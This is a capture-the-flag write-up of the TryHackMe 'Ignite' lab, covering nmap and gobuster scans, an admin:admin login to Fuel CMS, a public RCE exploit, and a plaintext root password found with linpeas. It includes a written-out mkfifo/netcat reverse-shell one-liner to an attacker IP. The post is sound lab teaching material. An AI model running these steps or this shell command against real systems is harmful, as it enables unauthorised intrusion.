---
title: "TryHackMe - Ignite"
author: Nasrallah
description: ""
date: 2022-03-21 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, rce, exploit]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Ignite](https://tryhackme.com/room/ignite) from [TryHackMe](https://tryhackme.com), and easy machine where we find a CMS vulnerable to RCE, we use an exploit to help us get a reverse shell on the machine, then we look through the CMS files to find a plain text password of root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressice scan to provide faster results.

```terminal
Nmap scan report for 10.10.89.94
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/fuel/
```

We only have port 80 open, and there is a robots.txt file, let's run a directory scan while we go check the webpage.

## WebPage

Let's navigate to the webpage.

![webpage](/assets/img/tryhackme/ignite/igniteweb.png)

We have Fuel CMS with version 1.4 running on the webserver. There is nothing else, let's check what we got from the directory scan.

## Gobuster

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.131/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.10.239.131/assets/]
/home                 (Status: 200) [Size: 16597]                                 
/index                (Status: 200) [Size: 16597]                                 
/index.php            (Status: 200) [Size: 16597]                                 
/lost+found           (Status: 400) [Size: 1134]                                  
/offline              (Status: 200) [Size: 70]                                    
/robots.txt           (Status: 200) [Size: 30]                                    
/server-status        (Status: 403) [Size: 301]                                   
===============================================================
```

Let's navigate to **/robots.txt**.

![robts](/assets/img/tryhackme/ignite/robots.png)

There is 1 disallowed entry, **/fuel**, let's see what there.

![login](/assets/img/tryhackme/ignite/loginpage.png)

We found a login page for **fuelcms**, let's see if we can get in by submitting some knows credentials.

![panle](/assets/img/tryhackme/ignite/panel.png)

I managed to login using **admin:admin**

Let's check if there is any exploit for this version of fuel cms.

![exploit](/assets/img/tryhackme/ignite/ignitexploitdb.png)

We found 3 RCE exploit, let's download one of the exploit and try run some commands. I will be using this [exploit](https://www.exploit-db.com/exploits/50477).

# **Foothold**

Let's run the exploit now.

![rce](/assets/img/tryhackme/ignite/rce.png)

We are able now to execute code on the machine, let's get a proper shell.

First, setup a listener on your attacking machine(`nc -lnvp 9001`) and execute the following command on the RCE prompt `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f`

>NOTE: Change the ip address on the command

![rce](/assets/img/tryhackme/ignite/mkfifo.png)

![rce](/assets/img/tryhackme/ignite/shell.png)

I used the python import pty trick to stabilize my shell.

# **Privilege Escalation**

For Privilege Escalation, i uploaded linpeas to the machine to do the scan for me.

![wget](/assets/img/tryhackme/ignite/wget.png)

Let's run the script and see what it will find.

![rootpass](/assets/img/tryhackme/ignite/rootpass.png)

There is a root password in plain text in one of the file of the application. Let's see if it works.

![root](/assets/img/tryhackme/ignite/root.png)

Great! The password worked and we got root access.

---

Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .
